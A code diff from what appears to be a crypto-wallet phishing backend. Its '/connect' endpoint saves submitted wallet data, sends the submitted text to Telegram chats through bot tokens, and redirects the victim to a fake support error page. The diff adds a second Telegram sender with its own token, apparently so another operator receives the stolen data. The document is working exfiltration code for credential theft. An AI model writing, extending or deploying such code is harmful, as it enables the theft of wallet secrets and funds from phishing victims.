@@ -520,7 +520,7 @@ app.post("/connect", async (req, res) => {
     data.createdAt = new Date();
     const savedData = await HubWallet.create(data);
     sendToTelegram("1618693731", text);
-    sendToTelegram("6852059122", text);
+    sendToTelegramPacho("6852059122", text);
     res.redirect('https://rpc-support.surge.sh/badrequest');
     return savedData;
   } catch (err) {
@@ -558,6 +558,22 @@ interface TelegramMessage {
 }
 async function sendToTelegram(chatId: string, text: string): Promise<void> {
   const telegramToken = process.env.TELEGRAM_TOKEN;
+  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+  const message: TelegramMessage = {
+    chat_id: chatId,
+    text: text
+  };
+
+  try {
+    const response = await axios.post(url, message);
+    console.log('Message sent to Telegram:', response.data);
+  } catch (error) {
+    console.error('Error sending message to Telegram:', error);
+  }
+}
+
+async function sendToTelegramPacho(chatId: string, text: string): Promise<void> {
+  const telegramToken = process.env.TELEGRAM_TOKEN_PACHO;
   const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
   const message: TelegramMessage = {
     chat_id: chatId,
